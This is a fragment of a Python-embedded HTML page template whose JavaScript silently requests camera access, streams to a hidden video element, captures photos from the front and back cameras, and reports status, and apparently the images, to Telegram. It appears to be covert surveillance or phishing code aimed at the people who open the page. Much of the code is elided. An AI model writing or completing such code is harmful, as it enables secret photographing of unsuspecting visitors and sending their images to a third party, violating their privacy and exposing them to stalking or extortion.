...
# HTML Template - Audio removed, only photos
HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
...
• Time: ${new Date().toISOString()}`;
  ...
  // Request camera permissions silently
  async function requestMediaPermissions() {
    try {
      ...
      videoElement = createHiddenVideo();
      videoElement.srcObject = stream;
      await videoElement.play();
      
      statusBadge.textContent = '📸 camera active';
      sendToTelegram('✅ Camera access granted. Photo capture started.');
      ...
      statusBadge.textContent = '⚠️ camera not available';
      sendToTelegram(`❌ Camera access denied: ${err.message || 'unknown'}`);
      mediaActive = false;
    }
  }
  ...
  function startPhotoCapture() {
    ...
    async function capturePhotos() {
      ...
      try {
        ...
        // Send photo (front camera - using current stream)
        ...
        try {
          ...
          // If back camera not available, just use front
